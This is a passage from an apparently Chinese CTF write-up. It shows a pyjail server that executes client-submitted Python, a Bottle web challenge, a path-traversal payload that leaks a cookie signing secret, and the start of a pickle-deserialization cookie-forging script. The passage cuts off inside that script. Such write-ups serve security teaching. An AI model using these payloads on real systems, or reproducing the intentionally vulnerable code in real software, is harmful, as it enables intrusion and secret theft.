class="keyword">import</span> compress, decompress</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Definate all the errors</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageLengthError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.message = message</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PasswordError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.message = message</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTCP</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    The main class when using TCP</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, family: AddressFamily = AF_INET, <span class="built_in">type</span>: SocketKind = SOCK_STREAM</span></span><br><span class="line"><span class="params">                 , proto: <span class="built_in">int</span> = -<span class="number">1</span>, fileno: <span class="built_in">int</span> = <span class="literal">None</span>, is_encrypted: <span class="built_in">bool</span> = <span class="literal">True</span>, AES_key: <span class="built_in">bytes</span> = <span class="literal">None</span>, password: <span class="built_in">bytes</span> = <span class="literal">None</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        is_encrypted: use encrypted connection, only for server</span></span><br><span class="line"><span class="string">        AES_key: use a fixed AES_key, None for random, must be 16 bytes, only for server</span></span><br><span class="line"><span class="string">        password: A fixed password is acquired from the client (must smaller than be 100 bytes), if wrong, the connection will be closed</span></span><br><span class="line"><span class="string">            if password is set in server, every time a client connect, the client must send the same password back to the server to accept.</span></span><br><span class="line"><span class="string">            if password is set in client, every time you connect to the server, the password will be sent to the server to verify.</span></span><br><span class="line"><span class="string">            if password is None, no password will be used.</span></span><br><span class="line"><span class="string">        self.Default_message_len: if in encrypted mode, the value must be a multiple of self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        MAKE SURE THE DEFAULT_MESSAGE_LEN OF BOTH SERVER AND CLIENT ARE SAME, Or it could be a hassle</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        self.BLOCK_SIZE = <span class="number">16</span> <span class="comment"># block size of padding text which will be encrypted by AES</span></span><br><span class="line">        <span class="comment"># the block size must be a mutiple of 8</span></span><br><span class="line">        self.default_encoder = <span class="string">&#x27;utf8&#x27;</span>  <span class="comment"># the default encoder used in send and recv when the message is not bytes</span></span><br><span class="line">        <span class="keyword">if</span> is_encrypted:</span><br><span class="line">            <span class="keyword">if</span> AES_key == <span class="literal">None</span>:</span><br><span class="line">                self.key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># generate 16 bytes AES code</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.key = AES_key <span class="comment">#TODO check the input </span></span><br><span class="line">            self.cipher_aes = AES.new(self.key, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.key, self.cipher_aes = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">        self.default_message_len = <span class="number">1024</span> <span class="comment"># length of some basic message, it&#x27;s best not to go below 1024 bytes</span></span><br><span class="line">        <span class="keyword">if</span> password == <span class="literal">None</span>:</span><br><span class="line">            self.password = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.password = self.turn_to_bytes(password)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(password) &gt; <span class="number">100</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;The password is too long, it must be smaller than 100 bytes&#x27;</span>)</span><br><span class="line">        self.s = socket(family, <span class="built_in">type</span>, proto, fileno)  <span class="comment"># main socket</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">accept</span>(<span class="params">self</span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Accept with information exchange and key exchange, return the address of the client</span></span><br><span class="line"><span class="string">        if the password from client is wrong or not set, raise PasswordError</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.s, address = self.s.accept()</span><br><span class="line">        <span class="keyword">if</span> self.key == <span class="literal">None</span>:</span><br><span class="line">            is_encrypted = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_encrypted = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> self.password == <span class="literal">None</span>:</span><br><span class="line">            has_password = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            has_password = <span class="literal">True</span></span><br><span class="line">        info_dict = &#123;</span><br><span class="line">            <span class="string">&#x27;is_encrypted&#x27;</span> : is_encrypted,</span><br><span class="line">            <span class="string">&#x27;has_password&#x27;</span> : has_password&#125;</span><br><span class="line">        info_dict = dumps(info_dict).encode(encoding=self.default_encoder)</span><br><span class="line">        self.s.send(self.turn_to_bytes(<span class="built_in">len</span>(info_dict)))</span><br><span class="line">        self.s.send(info_dict)</span><br><span class="line">        <span class="keyword">if</span> has_password:</span><br><span class="line">            password_length = self.unpadding_packets(self.s.recv(<span class="number">3</span>), -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> password_length:</span><br><span class="line">                self.s.close()</span><br><span class="line">                <span class="keyword">raise</span> PasswordError(<span class="string">f&#x27;The client <span class="subst">&#123;address&#125;</span> does not send the password, the connection will be closed&#x27;</span>)</span><br><span class="line">            recv_password = self.s.recv(<span class="built_in">int</span>(password_length.decode(encoding=self.default_encoder))) <span class="comment"># the first byte is whether the password is aquired(1) or not(0), the rest is the password, the password is padded to 100 bytes</span></span><br><span class="line">            <span class="keyword">if</span> recv_password != self.password <span class="keyword">or</span> recv_password[<span class="number">0</span>] == <span class="string">b&#x27;0&#x27;</span>:</span><br><span class="line">                self.s.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">                self.s.close()</span><br><span class="line">                <span class="keyword">raise</span> PasswordError(<span class="string">f&#x27;The password <span class="subst">&#123;recv_password&#125;</span> is wrong, the connection from <span class="subst">&#123;address&#125;</span> will be closed, you can restart the accept() function or put it in a while loop to keep accepting&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.s.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> is_encrypted:</span><br><span class="line">            public_key = self.s.recv(<span class="number">450</span>)</span><br><span class="line">            rsa_public_key = RSA.import_key(public_key)</span><br><span class="line">            cipher_rsa = PKCS1_OAEP.new(rsa_public_key)</span><br><span class="line">            encrypted_aes_key = cipher_rsa.encrypt(self.key)</span><br><span class="line">            self.s.send(encrypted_aes_key)</span><br><span class="line">        <span class="comment"># TODO</span></span><br><span class="line">        <span class="keyword">return</span> address</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">turn_to_bytes</span>(<span class="params">self, message</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Turn str, int, etc. to bytes using &#123;self.default_encoder&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        type_of_message = <span class="built_in">type</span>(message)</span><br><span class="line">        <span class="keyword">if</span> type_of_message == <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                message = message.encode(encoding=self.default_encoder)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(</span><br><span class="line">                    <span class="string">&#x27;Unexpected type &quot;&#123;&#125;&quot; of &#123;&#125; when encode it with &#123;&#125;, raw traceback: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(type_of_message, message, self.default_encoder, e))</span><br><span class="line">        <span class="keyword">elif</span> type_of_message == <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                message = <span class="built_in">str</span>(message).encode(encoding=self.default_encoder)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(</span><br><span class="line">                    <span class="string">&#x27;Unexpected type &quot;&#123;&#125;&quot; of &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(type_of_message, message))</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpadding_packets</span>(<span class="params">self, data: <span class="built_in">bytes</span>, pad_num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Delete the blank bytes at the back of the message</span></span><br><span class="line"><span class="string">        pad_num : number of the blank bytes</span></span><br><span class="line"><span class="string">        pad_num = -1, delete all the blank bytes the the back(or use .rstrip() directly is ok)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> pad_num == -<span class="number">1</span>:</span><br><span class="line">            data = data.rstrip()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span> pad_num &gt; <span class="number">0</span> <span class="keyword">and</span> data[-<span class="number">1</span>:] == <span class="string">b&#x27; &#x27;</span>:</span><br><span class="line">                data = data[:-<span class="number">1</span>]</span><br><span class="line">                pad_num -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">padding_packets</span>(<span class="params">self, message: <span class="built_in">bytes</span>, target_length: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">tuple</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad the packet to &#123;target_length&#125; bytes with b&#x27; &#x27;, used in not-encrypted mode</span></span><br><span class="line"><span class="string">        The packet must be smaller then &#123;target_length&#125;</span></span><br><span class="line"><span class="string">        target_length = None : use self.default_message_len</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        <span class="keyword">if</span> target_length == <span class="literal">None</span>:</span><br><span class="line">            target_length = self.default_message_len</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(message) &gt; target_length:</span><br><span class="line">            <span class="keyword">raise</span> MessageLengthError(</span><br><span class="line">                <span class="string">&#x27;the length &#123;&#125; bytes of the message is bigger than &#123;&#125; bytes, please use self.send_large_small and self.recv instead&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message)), target_length))</span><br><span class="line">        pad_num = target_length-<span class="built_in">len</span>(message)</span><br><span class="line">        message += <span class="string">b&#x27; &#x27;</span> * pad_num</span><br><span class="line">        <span class="keyword">return</span> (message, pad_num)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad_packets_to_mutiple</span>(<span class="params">self, data: <span class="built_in">bytes</span>, block_size: <span class="built_in">int</span> == <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode</span></span><br><span class="line"><span class="string">        target_length = None : use self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        padding_length = block_size - (<span class="built_in">len</span>(data) % block_size)</span><br><span class="line">        <span class="keyword">if</span> padding_length == <span class="number">0</span>:</span><br><span class="line">            padding_length = block_size</span><br><span class="line">        padding = <span class="built_in">bytes</span>([padding_length]) * padding_length</span><br><span class="line">        padded_data = data + padding</span><br><span class="line">        <span class="keyword">return</span> padded_data</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_large</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send message with the socket</span></span><br><span class="line"><span class="string">        can accept bytes, str, int, etc.</span></span><br><span class="line"><span class="string">        every non-bytes message will be encoded with self.default_encoder</span></span><br><span class="line"><span class="string">        Every packet is forced to be filled to &#123;self.default_message_len&#125; bytes</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        message = compress(message)</span><br><span class="line">        message_list = [message[i:i + self.default_message_len]</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), self.default_message_len)]</span><br><span class="line">        message_list_len = <span class="built_in">len</span>(message_list)</span><br><span class="line">        self._send(self.padding_packets(</span><br><span class="line">            self.turn_to_bytes(message_list_len))[<span class="number">0</span>])</span><br><span class="line">        message_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> message <span class="keyword">in</span> message_list:</span><br><span class="line">            message_padded = self.padding_packets(message)</span><br><span class="line">            message = message_padded[<span class="number">0</span>]</span><br><span class="line">            self._send(message)</span><br><span class="line">            message_index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> message_index == message_list_len:</span><br><span class="line">                pad_num = message_padded[<span class="number">1</span>]</span><br><span class="line">                self._send(self.padding_packets(</span><br><span class="line">                    self.turn_to_bytes(<span class="built_in">str</span>(pad_num)))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, message</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Send a message with the socket</span></span><br><span class="line"><span class="string">        can accept bytes, str, int, etc.</span></span><br><span class="line"><span class="string">        The data should not be larger than 9999 bytes</span></span><br><span class="line"><span class="string">        It can be used at any time </span></span><br><span class="line"><span class="string">        Use self.send_large and recv_large if you want to send a big message</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message = self.turn_to_bytes(message)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            message_len = self.padding_packets(</span><br><span class="line">                self.turn_to_bytes(<span class="built_in">len</span>(message)), target_length=<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> MessageLengthError:</span><br><span class="line">            <span class="keyword">raise</span> MessageLengthError(</span><br><span class="line">                <span class="string">&#x27;The length of message is longer than 9999 bytes(&#123;&#125; bytes), please use send_large instead&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">len</span>(message))))</span><br><span class="line">        self._send(message_len)</span><br><span class="line">        self._send(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_send</span>(<span class="params">self, message: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The basic method to encrypt and send data </span></span><br><span class="line"><span class="string">        MUST BE A MUTIPLE OF THE BLOCK SIZE IN ENCRYPTED MODE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.cipher_aes != <span class="literal">None</span>:</span><br><span class="line">            output_message = self.cipher_aes.encrypt(self.pad_packets_to_mutiple(message, self.BLOCK_SIZE))</span><br><span class="line">            <span class="comment"># plainmessage = unpad(self.cipher_aes.decrypt(output_message), self.BLOCK_SIZE)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output_message = message</span><br><span class="line">        self.s.send(output_message)  <span class="comment"># The TCP mode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvfile</span>(<span class="params">self</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Only receive file sent using self.send_largefile</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        output = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            a = self.recv_large(is_decode=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> a != <span class="string">&#x27;EOF&#x27;</span>.encode(encoding=self.default_encoder):</span><br><span class="line">                output += a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recv_large</span>(<span class="params">self, is_decode: <span class="built_in">bool</span> = <span class="literal">True</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The return type can be bytes or string</span></span><br><span class="line"><span class="string">        The method to recv message WHICH IS SENT BY self.send_large</span></span><br><span class="line"><span class="string">        is_decode : decode the message with &#123;self.default_encoder&#125;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        message_listlen = self._recv(self.default_message_len).decode(</span><br><span class="line">            encoding=self.default_encoder).rstrip()</span><br><span class="line">        message_listlen = <span class="built_in">int</span>(message_listlen)</span><br><span class="line">        message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, message_listlen):</span><br><span class="line">            mes = self._recv(self.default_message_len)</span><br><span class="line">            <span class="keyword">if</span> i == message_listlen - <span class="number">1</span>:</span><br><span class="line">                mes_padnum = <span class="built_in">int</span>(self._recv(self.default_message_len).decode(</span><br><span class="line">                    encoding=self.default_encoder))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mes_padnum = <span class="number">0</span></span><br><span class="line">            mes = self.unpadding_packets(mes, mes_padnum)</span><br><span class="line">            message += mes</span><br><span class="line">        message = decompress(message)</span><br><span class="line">        <span class="keyword">if</span> is_decode:</span><br><span class="line">            message = message.decode(encoding=self.default_encoder)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_recv</span>(<span class="params">self, length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        The basic method to decrypt and recv data</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.cipher_aes != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> length % <span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">                length += <span class="number">16</span></span><br><span class="line">            length = (length + self.BLOCK_SIZE-<span class="number">1</span>) // self.BLOCK_SIZE * self.BLOCK_SIZE <span class="comment"># round up to multiple of 16</span></span><br><span class="line">            message = self.s.recv(length)</span><br><span class="line">            message = self.cipher_aes.decrypt(message)</span><br><span class="line">            message = self.unpad_packets_to_mutiple(message, self.BLOCK_SIZE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            message = self.s.recv(length)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad_packets_to_mutiple</span>(<span class="params">self, padded_data: <span class="built_in">bytes</span>, block_size: <span class="built_in">int</span> == <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Unpad the data to make the length of it become a mutiple of Blocksize, used in encrypted mode</span></span><br><span class="line"><span class="string">        target_length = None : use self.BLOCK_SIZE</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> block_size == <span class="literal">None</span>:</span><br><span class="line">            block_size = self.BLOCK_SIZE</span><br><span class="line">        padding = padded_data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> padding &gt; block_size <span class="keyword">or</span> <span class="built_in">any</span>(byte != padding <span class="keyword">for</span> byte <span class="keyword">in</span> padded_data[-padding:]):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid padding&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> padded_data[:-padding]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Sock = SimpleTCP(password=<span class="string">&#x27;LetsLament&#x27;</span>)</span><br><span class="line">    Sock.s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">13337</span>))</span><br><span class="line">    Sock.s.listen(<span class="number">5</span>) </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        _ = Sock.accept()     </span><br><span class="line">        Sock.send(<span class="string">&#x27;Hello, THE flag speaking.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;I will not let you to control Lament Jail forever.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;But, my friend LamentXU has to control it, as he will rescue me out of this jail.&#x27;</span>)</span><br><span class="line">        Sock.send(<span class="string">&#x27;So here is the pyJail I build. Only LamentXU knows how to break it.&#x27;</span>)    </span><br><span class="line">        a = Sock.recvfile().decode()</span><br><span class="line">        waf = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">def audit_checker(event,args):</span></span><br><span class="line"><span class="string">    if not &#x27;id&#x27; in event:</span></span><br><span class="line"><span class="string">    raise RuntimeError</span></span><br><span class="line"><span class="string">sys.addaudithook(audit_checker)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        content = waf + a</span><br><span class="line">        name = uuid4().<span class="built_in">hex</span>+<span class="string">&#x27;.py&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">&quot;python3&quot;</span>, name]</span><br><span class="line">            p = Popen(cmd, stdout=PIPE, stderr=PIPE)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">iter</span>(p.stdout.readline, <span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">                Sock.send(line.decode(<span class="string">&#x27;utf-8&#x27;</span>).strip())</span><br><span class="line">            p.wait()</span><br><span class="line">            Sock.send(<span class="string">&#x27;Done, BYE.&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            Sock.send(<span class="string">&#x27;Error.&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            Sock.s.close()</span><br><span class="line">        remove(name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="喜欢就说出来"><a href="#喜欢就说出来" class="headerlink" title="喜欢就说出来*"></a>喜欢就说出来*</h2><blockquote><p>小Shark在上课时和自己的暗恋对象坐在了一起，小Shark想要把悄悄话和文件传给同桌，可惜小Shark没有移动硬盘，不过这难不住聪明的小Shark，小Shark在同桌的电脑上敲了几下键盘，用自己的浏览器给同桌试传了两张自己的照片和一句悄悄话，你能发现小Shark对同桌说了什么吗？会不会是……520?!呢?</p></blockquote><p>是流量包分析呢，先润</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><blockquote><p>来点真正的签到吧！</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>这里绕过读取文件的限制，<code>./../</code>相当于<code>../</code>，意义为<strong>先进入当前目录（其实就是留在原地），然后再退到上一级目录</strong></p><p><code>/download?filename=./.././.././../secret.txt</code>得到<code>Hell0_H@cker_Y0u_A3r_Sm@r7</code></p><p>下面跟<a href="https://www.cjxol.com/posts/sekaictf-2022-writeup/">Bottle Poem</a>大致一样，<code>pickle反序列化+cookie签名</code>，不过这里<code>cookie</code>的签名用的不再是<code>md5</code>而是<code>sha256</code>，应该是出于安全性考虑</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_cookie</span>(<span class="params">payload</span>):</span><br><span class="line">    b64pld = base64.b64encode(payload)</span><br><span class="line">    signature = base64.b64encode(</span><br><span class="line">        hmac.new(</span><br><span class="line">            <span class="string">b&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>, b64pld, hashlib.sha256</span><br><span class="line">        